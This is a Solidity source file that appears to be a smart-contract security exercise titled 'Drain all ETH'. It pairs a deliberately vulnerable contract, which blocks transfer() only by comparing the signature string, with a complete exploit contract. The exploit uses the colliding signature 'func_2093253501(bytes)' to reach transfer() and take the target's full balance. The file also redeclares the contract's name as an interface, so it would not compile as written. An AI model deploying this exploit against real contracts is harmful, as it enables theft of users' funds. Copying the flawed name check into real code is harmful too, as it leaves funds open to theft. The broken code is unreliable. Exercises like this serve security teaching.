// SPDX-License-Identifier: MIT

/**
Drain all ETH from FunctionSelectorClash contract below.

*/


pragma solidity ^0.8.17;

contract FunctionSelectorClash {
    constructor() payable {}

    function execute(string calldata _func, bytes calldata _data) external {
        require(
            !equal(_func, "transfer(address,uint256)"),
            "call to transfer not allowed"
        );

        bytes4 sig = bytes4(keccak256(bytes(_func)));

        (bool ok, ) = address(this).call(abi.encodePacked(sig, _data));
        require(ok, "tx failed");
    }

    function transfer(address payable _to, uint _amount) external {
        require(msg.sender == address(this), "not authorized");
        _to.transfer(_amount);
    }

    function equal(
        string memory a,
        string memory b
    ) private pure returns (bool) {
        return keccak256(abi.encode(a)) == keccak256(abi.encode(b));
    }
}

interface FunctionSelectorClash {
    function execute(string calldata _func, bytes calldata _data) external;
}

contract FunctionSelectorClashExploit {
    address public immutable target;

    constructor(address _target) {
        target = _target;
    }

    // Receive ETH from target
    receive() external payable {}

    function pwn() external {
        FunctionSelectorClash(target).execute(
                "func_2093253501(bytes)",
                abi.encode(msg.sender, target.balance)
            );
        }
}
